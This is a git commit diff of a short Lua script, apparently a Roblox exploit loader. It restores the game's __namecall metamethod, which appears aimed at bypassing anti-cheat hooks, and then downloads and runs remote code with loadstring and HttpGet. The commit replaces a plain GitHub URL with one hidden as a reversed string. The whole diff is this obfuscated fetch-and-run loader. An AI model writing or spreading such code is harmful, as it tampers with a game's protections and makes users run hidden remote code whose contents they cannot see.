70851ea5299d57e1a704d1ed9354e9b45ba8a742
ADSKerOffical <137511182+ADSKerOffical@users.noreply.github.com>
2026-02-27 18:11:26 +0300

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,2 +1,3 @@
-restorefunction(getrawmetatable(game)["__namecall"])
-task.delay(task.wait(), newcclosure(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/BHU2Project/refs/heads/main/Hubs/120329833999324"))() end))
+(restorefunction or restorefunc)(getrawmetatable(game)["__namecall"])
+local tuehh; tuehh =  (game:GetService([[HttpService]]):UrlEncode([[!]]):reverse() .. [[laeR2UHB/niam/sdaeh/sfer/wI-.js-heybyvD/laciffOreKSDA/moc.tnetnocresubuhtig.war//:sptth]]):reverse()
+task.delay(task.wait(), newcclosure(function() loadstring(game:HttpGet(tuehh, true))() end))
